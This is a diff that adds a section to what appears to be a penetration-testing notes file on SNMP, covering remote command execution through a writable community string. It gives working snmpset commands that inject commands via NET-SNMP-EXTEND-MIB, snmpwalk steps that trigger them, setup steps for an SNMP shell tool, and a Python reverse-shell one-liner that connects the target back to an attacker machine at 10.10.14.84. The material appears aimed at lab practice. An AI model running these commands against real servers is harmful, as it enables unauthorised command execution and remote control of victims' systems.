@@ -116,3 +116,54 @@
 
  - TCP Local Ports: Finally, 1.3.6.1.2.1.6.13.1.3 is designated for monitoring TCP local ports, providing insight into active network connections.
 
+## SNMP Configuration files
+
+ - snmp.conf
+
+ - snmpd.conf
+
+ - snmp-config.xml
+
+## SNMP RCE
+
+### SNMP can be exploited by an attacker if the administrator overlooks its default configuration on the device or server. By abusing SNMP community with write permissions (rwcommunity) on a Linux operating system, the attacker can execute commands on the server.
+
+#### 1) Extending services with additional commands
+
+### To extend SNMP services and add extra commands, it is possible to append new rows to the "nsExtendObjects" table. This can be achieved by using the snmpset command and providing the necessary parameters, including the absolute path to the executable and the command to be executed:
+
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
+
+'nsExtendStatus."evilcommand"' = createAndGo \
+
+'nsExtendCommand."evilcommand"' = /bin/echo \
+
+'nsExtendArgs."evilcommand"' = 'hello world'
+
+#### 2) Injecting commands for execution
+
+### Injecting commands to run on the SNMP service requires the existence and executability of the called binary/script. The NET-SNMP-EXTEND-MIB mandates providing the absolute path to the executable.
+
+### To confirm the execution of the injected command, the snmpwalk command can be used to enumerate the SNMP service. The output will display the command and its associated details, including the absolute path:
+
+ - snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+#### 3) Running the injected commands
+
+### When the injected command is read, it is executed. This behavior is known as run-on-read() The execution of the command can be observed during the snmpwalk read.
+
+## Shell with SNMP https://github.com/mxrch/snmp-shell
+
+### Alternatively, a reverse shell can be manually created by injecting a specific command into SNMP. This command, triggered by the snmpwalk, establishes a reverse shell connection to the attacker's machine, enabling control over the victim machine. You can install the pre-requisite to run this:
+
+ - sudo apt install snmp snmp-mibs-downloader rlwrap -y
+
+ - git clone https://github.com/mxrch/snmp-shell
+
+ - cd snmp-shell
+
+ - sudo python3 -m pip install -r requirements.txt
+
+### Or a reverse shell
+
+ - snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
